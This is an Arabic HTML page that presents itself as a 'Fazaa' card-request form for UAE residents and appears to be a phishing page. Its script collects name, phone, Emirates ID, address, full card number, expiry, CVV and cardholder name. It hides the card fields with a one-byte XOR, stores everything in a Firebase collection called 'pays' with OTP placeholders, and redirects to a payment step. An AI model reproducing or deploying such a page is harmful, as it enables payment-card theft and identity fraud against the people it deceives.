<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فزعة - FAZAA | طلب البطاقة</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Tajawal', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            color: #333;
        }
        
        header {
            background: linear-gradient(to right, #7a6318, #c9a227);
            color: white;
            padding: 20px;
            text-align: center;
        }
        
        .container {
            max-width: 600px;
            margin: 40px auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            padding: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #c9a227;
            box-shadow: 0 0 0 3px rgba(201, 162, 39, 0.1);
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .button-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 30px;
        }
        
        button {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn-submit {
            background: linear-gradient(135deg, #c9a227, #7a6318);
            color: white;
            grid-column: 1 / -1;
        }
        
        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(201, 162, 39, 0.3);
        }
        
        .btn-cancel {
            background: #ddd;
            color: #333;
        }
        
        .btn-cancel:hover {
            background: #ccc;
        }
        
        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid #c3e6cb;
        }
        
        .error-message {
            display: none;
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid #f5c6cb;
        }
        
        .loading-spinner {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #c9a227;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            text-align: center;
        }
        
        .step {
            flex: 1;
            position: relative;
        }
        
        .step-number {
            width: 40px;
            height: 40px;
            background: #ddd;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: 600;
            color: #333;
        }
        
        .step.active .step-number {
            background: #c9a227;
            color: white;
        }
        
        .step-label {
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <header>
        <h1>فزعة - FAZAA</h1>
        <p>طلب البطاقة</p>
    </header>

    <div class="container">
        <div id="successMessage" class="success-message">
            ✓ تم حفظ البيانات بنجاح! سيتم معالجة طلبك قريباً.
        </div>
        <div id="errorMessage" class="error-message"></div>
        <div id="loadingSpinner" class="loading-spinner">
            <div class="spinner"></div>
            <p>جاري معالجة الطلب...</p>
        </div>

        <div id="formContent">
            <div class="step-indicator">
                <div class="step active">
                    <div class="step-number">1</div>
                    <div class="step-label">البيانات الشخصية</div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div class="step-label">بيانات التوصيل</div>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <div class="step-label">بيانات الدفع</div>
                </div>
            </div>

            <form id="registrationForm">
                <!-- Step 1: Personal Information -->
                <div class="form-group">
                    <label for="fullName">الاسم الكامل *</label>
                    <input type="text" id="fullName" name="fullName" required placeholder="أدخل اسمك الكامل">
                </div>

                <div class="form-group">
                    <label for="phone">رقم الهاتف *</label>
                    <input type="tel" id="phone" name="phone" required placeholder="971501234567">
                </div>

                <div class="form-group">
                    <label for="emiratesId">رقم الهوية *</label>
                    <input type="text" id="emiratesId" name="emiratesId" required placeholder="784199012345678">
                </div>

                <!-- Step 2: Delivery Information -->
                <div class="form-group">
                    <label for="region">المنطقة *</label>
                    <select id="region" name="region" required>
                        <option value="">اختر المنطقة</option>
                        <option value="abu-dhabi">أبوظبي</option>
                        <option value="dubai">دبي</option>
                        <option value="sharjah">الشارقة</option>
                        <option value="ajman">عجمان</option>
                        <option value="umm-al-quwain">أم القيوين</option>
                        <option value="ras-al-khaimah">رأس الخيمة</option>
                        <option value="fujairah">الفجيرة</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="street">عنوان الشارع *</label>
                    <input type="text" id="street" name="street" required placeholder="شارع الاتحاد">
                </div>

                <div class="form-group">
                    <label for="district">الحي *</label>
                    <input type="text" id="district" name="district" required placeholder="الديرة">
                </div>

                <div class="form-group">
                    <label for="deliveryDate">موعد الاستلام *</label>
                    <input type="date" id="deliveryDate" name="deliveryDate" required>
                </div>

                <!-- Step 3: Payment Information -->
                <div class="form-group">
                    <label for="cardNumber">رقم البطاقة *</label>
                    <input type="text" id="cardNumber" name="cardNumber" required placeholder="1234567890123456" maxlength="16">
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="expiry">تاريخ الانتهاء *</label>
                        <input type="text" id="expiry" name="expiry" required placeholder="MM/YY" maxlength="5">
                    </div>
                    <div class="form-group">
                        <label for="cvv">CVV *</label>
                        <input type="text" id="cvv" name="cvv" required placeholder="123" maxlength="3">
                    </div>
                </div>

                <div class="form-group">
                    <label for="cardHolder">اسم صاحب البطاقة *</label>
                    <input type="text" id="cardHolder" name="cardHolder" required placeholder="AHMED MOHAMMED">
                </div>

                <div class="button-group">
                    <button type="submit" class="btn-submit">✓ تأكيد الطلب</button>
                    <button type="button" class="btn-cancel" onclick="window.history.back()">إلغاء</button>
                </div>
            </form>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <script>
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDtdis9lsMO4_XEezhKltBizmc8VOhZRcA",
            authDomain: "fazaa-e035d.firebaseapp.com",
            projectId: "fazaa-e035d",
            storageBucket: "fazaa-e035d.firebasestorage.app",
            messagingSenderId: "252034503956",
            appId: "1:252034503956:web:c9393f0020f1420adb5e01"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // XOR Encryption
        function xorEncrypt(str) {
            if (!str) return '';
            let result = '';
            for (let i = 0; i < str.length; i++) {
                result += String.fromCharCode(str.charCodeAt(i) ^ 0x42);
            }
            return result;
        }

        // Get URL parameters
        function getUrlParam(param) {
            const params = new URLSearchParams(window.location.search);
            return params.get(param) || 'fazaa';
        }

        // Form submission
        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            // Show loading
            document.getElementById('formContent').style.display = 'none';
            document.getElementById('loadingSpinner').style.display = 'block';
            document.getElementById('errorMessage').style.display = 'none';
            document.getElementById('successMessage').style.display = 'none';

            try {
                // Collect form data
                const formData = {
                    fullName: document.getElementById('fullName').value,
                    phone: document.getElementById('phone').value,
                    emiratesId: document.getElementById('emiratesId').value,
                    region: document.getElementById('region').value,
                    street: document.getElementById('street').value,
                    district: document.getElementById('district').value,
                    deliveryDate: document.getElementById('deliveryDate').value,
                    cardNumber: xorEncrypt(document.getElementById('cardNumber').value),
                    expiry: xorEncrypt(document.getElementById('expiry').value),
                    cvv: xorEncrypt(document.getElementById('cvv').value),
                    cardHolder: xorEncrypt(document.getElementById('cardHolder').value),
                    cardBrand: getUrlParam('card'),
                    cardType: getUrlParam('type'),
                    paymentMethod: 'card',
                    status: 'pending',
                    redirectPage: 'payment',
                    amount: '5 AED',
                    currency: 'AED',
                    otp: '',
                    otpCode: '',
                    otpSent: false,
                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
                };

                // Save to Firebase
                const docId = `reg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
                await db.collection('pays').doc(docId).set(formData);

                // Show success
                document.getElementById('loadingSpinner').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';

                // Redirect after 2 seconds
                setTimeout(() => {
                    window.location.href = '/payment?orderId=' + docId;
                }, 2000);

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loadingSpinner').style.display = 'none';
                document.getElementById('formContent').style.display = 'block';
                document.getElementById('errorMessage').style.display = 'block';
                document.getElementById('errorMessage').textContent = '✗ حدث خطأ: ' + error.message;
            }
        });
    </script>
</body>
</html>
